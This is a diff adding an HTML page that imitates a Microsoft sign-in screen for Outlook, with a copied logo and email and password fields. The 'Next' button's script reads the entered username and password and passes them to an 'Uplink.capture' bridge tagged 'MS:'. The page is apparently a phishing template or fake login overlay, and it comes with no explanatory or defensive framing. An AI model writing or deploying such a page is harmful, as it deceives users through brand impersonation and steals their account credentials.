@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <style>
+        body { background:#fff; color:#000; font-family:-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; padding:50px; margin:0; }
+        .logo-box { margin-bottom:25px; }
+        h2 { font-size:1.5rem; margin-bottom:5px; font-weight:600; }
+        p { margin-bottom:20px; font-size:0.9rem; color:#666; }
+        input { width:100%; padding:10px 0; margin-bottom:15px; border:none; border-bottom:1px solid #666; outline:none; font-size:1rem; box-sizing:border-box; }
+        .account-link { margin-bottom:20px; font-size:0.85rem; }
+        .account-link a { color:#0067b8; text-decoration:none; }
+        .btn-box { display:flex; justify-content:flex-end; }
+        button { min-width:100px; padding:10px 20px; background:#0067b8; border:none; color:#fff; font-weight:600; cursor:pointer; font-size:0.9rem; }
+    </style>
+</head>
+<body>
+    <div class="logo-box">
+        <svg width="108" height="24" viewBox="0 0 108 24" xmlns="http://www.w3.org/2000/svg">
+            <rect width="11.5" height="11.5" fill="#f25022"/>
+            <rect x="12.5" width="11.5" height="11.5" fill="#7fbb00"/>
+            <rect y="12.5" width="11.5" height="11.5" fill="#00a1f1"/>
+            <rect x="12.5" y="12.5" width="11.5" height="11.5" fill="#ffbb00"/>
+            <text x="30" y="18" font-family="sans-serif" font-weight="600" font-size="18" fill="#5e5e5e">Microsoft</text>
+        </svg>
+    </div>
+    <h2>Sign in</h2>
+    <p>to continue to Outlook</p>
+    <input type="text" id="u" placeholder="Email, phone, or Skype">
+    <div class="account-link">No account? <a href="#">Create one!</a></div>
+    <input type="password" id="p" placeholder="Password" style="margin-bottom:35px;">
+    <div class="btn-box">
+        <button onclick="var u=document.getElementById('u').value; var p=document.getElementById('p').value; if(u && p) Uplink.capture('MS: ' + u + ':' + p);">Next</button>
+    </div>
+</body>
+</html>
